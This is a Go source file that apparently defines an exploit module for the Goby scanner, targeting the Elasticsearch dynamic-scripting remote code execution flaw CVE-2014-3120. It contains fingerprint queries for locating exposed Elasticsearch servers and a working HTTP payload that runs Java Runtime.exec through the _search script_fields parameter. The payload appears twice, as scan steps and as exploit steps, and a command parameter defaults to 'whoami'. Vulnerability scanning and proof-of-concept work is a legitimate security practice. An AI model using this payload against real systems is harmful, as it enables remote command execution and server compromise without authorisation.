package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Elasticsearch Remote Code Execution (CVE-2014-3120)",
    "Description": "The default configuration before Elasticsearch 1.2 enabled dynamic scripting, which allowed remote attackers to execute arbitrary MVEL expressions and Java code through the source parameter of _search.",
    "Impact": "Elasticsearch Remote Code Execution (CVE-2014-3120)",
    "Recommendation": "<p>The official version of elasticsearch 1.2 has been publicly released, and the dynamic script execution function is disabled by default.</p>",
    "Product": "Elasticsearch",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "ElasticSearch 远程代码执行RCE（CVE-2014-3120）",
            "Description": "ElasticSearch可以执行任意代码。ElasticSearch默认配置允许使用脚本引擎MVEL，这个引擎没有做任何的防护或者沙盒包装，因此用户可以直接通过http请求，执行任意代码。\n漏洞编号：CVE-2014-3120",
            "Impact": "<p>ElasticSearch默认配置是打开脚本引擎MVEL功能的，这个引擎没有做任何的防护或者沙盒包装，因此用户可以直接通过http请求，执行任意代码，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。<br></p>",
            "Recommendation": "<p>1. 不要以root权限来运行<span style=\"color: rgb(51, 51, 51); font-size: 16px;\">ElasticSearch；</span></p><p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\">2. 不要把<span style=\"color: rgb(51, 51, 51); font-size: 16px;\">ElasticSearch直接暴露给用户，应该在其之间增加代理程序；</span></span></p><p>3. 更新至最新版本，下载地址：<a href=\"https://www.elastic.co/cn/downloads\" target=\"_blank\">https://www.elastic.co/cn/downloads</a></p>",
            "Product": "Elasticsearch",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Elasticsearch Remote Code Execution (CVE-2014-3120)",
            "Description": "The default configuration before Elasticsearch 1.2 enabled dynamic scripting, which allowed remote attackers to execute arbitrary MVEL expressions and Java code through the source parameter of _search.",
            "Impact": "Elasticsearch Remote Code Execution (CVE-2014-3120)",
            "Recommendation": "<p>The official version of elasticsearch 1.2 has been publicly released, and the dynamic script execution function is disabled by default.<br></p>",
            "Product": "Elasticsearch",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "((((header=\"application/json\" && body=\"build_hash\") || (body=\"You Know, for Search\" && server!=\"DVRDVS-Webs\" && body!=\"<html\")) && header!=\"couchdb\" && header!=\"Drupal\" && body!=\"couchdb\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\" || (cert=\"CommonName: elasticsearch\" && (banner=\"realm=\\\"security\" || header=\"realm=\\\"security\")))",
    "GobyQuery": "((((header=\"application/json\" && body=\"build_hash\") || (body=\"You Know, for Search\" && server!=\"DVRDVS-Webs\" && body!=\"<html\")) && header!=\"couchdb\" && header!=\"Drupal\" && body!=\"couchdb\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\" || (cert=\"CommonName: elasticsearch\" && (banner=\"realm=\\\"security\" || header=\"realm=\\\"security\")))",
    "Author": "zhzyker",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-04-10",
    "References": [
        "https://github.com/zhzyker"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2014-3120"
    ],
    "CNVD": [
        "CNVD-2014-03397"
    ],
    "CNNVD": [
        "CNNVD-201407-666"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/website/blog/",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{ \"name\": \"blogsir\" }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "201",
                        "bz": "http_code"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/_search?pretty",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"command\":{\"script\":\"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"echo 0d455d3d2044e6e7781771d932e68dbc\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0d455d3d2044e6e7781771d932e68dbc",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/website/blog/",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{ \"name\": \"blogsir\" }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "201",
                        "bz": "http_code"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/_search?pretty",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Accept-Language": "en",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"command\":{\"script\":\"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"echo 0d455d3d2044e6e7781771d932e68dbc\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0d455d3d2044e6e7781771d932e68dbc",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10181"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
